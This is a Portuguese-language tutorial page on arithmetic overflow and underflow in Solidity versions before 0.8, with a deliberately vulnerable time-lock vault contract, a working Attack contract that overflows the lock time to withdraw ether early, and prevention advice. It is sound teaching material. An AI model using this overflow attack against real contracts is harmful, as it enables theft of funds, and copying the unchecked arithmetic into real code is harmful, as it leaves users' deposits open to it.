# Overflow e Underflow Aritméticos

#### Vulnerabilidade <a href="#vulnerability" id="vulnerability"></a>

**Solidity < 0.8**

Números inteiros no Solidity overflow / underflow sem nenhum erro

**Solidity >= 0.8**

Comportamento padrão do Solidity **>=** 0.8 para overflow / underflow é lançar um erro.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

// Este contrato é designado para atuar como um cofre temporário.
// O usuário pode depositar nesse contrato mas não pode retirar por pelo menos 1 semana.
// O usuário também pode estender o tempo de espera além do período de 1 semana.

/*
1. Implemente TimeLock
2. Implemente Attack com endereço do TimeLock
3. Chame Attack.attack enviando 1 ether. Você será capaz de retirar 
   seu ether imediatamente.

O que aconteceu?
Attack causou overflow do TimeLock.lockTime e foi capaz de retirar
antes do período de 1 semana.
*/

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        se t = tempo de bloqueio atual então precisamos encontrar x tal que
        x + t = 2**256 = 0
        então x = -t
        2**256 = type(uint).max + 1
        então x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}
```



#### Técnicas preventivas <a href="#preventative-techniques" id="preventative-techniques"></a>

* Use [SafeMath](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol) para evitar overflow e underflow
* Solidity 0.8 tem como padrão lançar um erro para overflow / underflow
